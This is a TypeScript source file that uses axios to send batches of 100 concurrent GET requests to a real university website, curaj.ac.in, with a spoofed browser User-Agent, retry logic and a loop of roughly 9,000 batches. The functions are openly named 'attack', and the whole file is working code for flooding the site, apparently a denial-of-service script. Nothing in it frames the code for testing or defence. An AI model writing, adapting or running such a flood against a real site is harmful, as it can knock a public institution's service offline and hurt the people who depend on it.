import axios from 'axios';

// Axios request options with a 5-second timeout
const options = {
  method: 'GET',
  url: 'https://curaj.ac.in/',
  timeout: 5000, // Set timeout to 5 seconds
  headers: {
    Accept: 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'en-US,en;q=0.9,en-IN;q=0.8',
    Connection: 'keep-alive',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0'
  }
};

// Delay function to introduce pauses between requests
function delay(ms : number) {
  return new Promise(resolve => setTimeout(resolve, ms));
}

// Function to perform the attack with retry logic
async function attack(retries = 3) {
  try {
    const { data } = await axios.request(options);
    return { success: true, data };
  } catch (error : any) {
    if (retries > 0) {
      console.warn(`Retrying... Attempts left: ${retries}`);
      await delay(1000); // 1-second delay before retrying
      return attack(retries - 1);
    }
    return { success: false, error: error.message };
  }
}

// Main function to perform the attack in batches
async function main() {
  let totalRequests = 0;

  for (let i = 100000; i < 999999; i += 100) {
    await delay(1000); // 1-second delay between batches
    let promises = [];
    console.log(`Starting batch for i = ${i}`);

    for (let j = 0; j < 100; j++) {
      promises.push(attack());
    }

    const batchResponses = await Promise.all(promises);
    totalRequests += 100;

    if (totalRequests % 100 === 0) {
      const sampleResponse = batchResponses[0];
      if (sampleResponse.success) {
        const response = sampleResponse.data.toString();
        console.log(`Response after ${totalRequests} requests:`, response.substring(0, 100));
      } else {
        console.error(`Error after ${totalRequests} requests:`, sampleResponse.error);
      }
    }
  }
}

main();
